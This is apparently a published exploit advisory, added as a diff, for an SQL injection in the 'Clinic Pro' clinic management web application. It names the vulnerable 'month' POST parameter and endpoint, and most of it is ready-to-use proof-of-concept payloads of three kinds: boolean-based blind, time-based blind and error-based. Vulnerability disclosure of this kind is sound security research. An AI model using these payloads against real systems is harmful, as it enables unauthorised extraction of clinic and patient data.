@@ -1,0 +1,31 @@
+# Title: Clinic Pro - Clinic Management Software
+# Date: 03.04.2019
+# Exploit Author: Abdullah Çelebi
+# Vendor Homepage: https://softwebinternational.com
+# Software Link: https://cms.softwebinternational.com
+# Category: Webapps
+# Tested on: WAMPP @Win
+# Software description:
+It is developed by PHP Codeigniter Framework with HMVC Pattern. Clinic
+system can be easily configured and fully automated as per clinic
+requirement using this Automation Software.
+
+# Vulnerabilities:
+# An attacker can access all data following an authorized user login using
+the parameter.
+
+
+# POC - SQLi :
+
+# Parameter: month (POST)
+# Request URL: http://localhost/welcome/monthly_expense_overview
+#    Type : boolean-based blind
+month=06%' RLIKE (SELECT (CASE WHEN (9435=9435) THEN 06 ELSE 0x28 END)) AND
+'%'='
+
+#    Type : time-based blind
+month=06%' AND 4514=BENCHMARK(5000000,MD5(0x436d7970)) AND '%'='
+
+#    Type : error-based
+month=06%' AND EXTRACTVALUE(2633,CONCAT(0x5c,0x7178766271,(SELECT
+(ELT(2633=2633,1))),0x7171717171)) AND '%'='
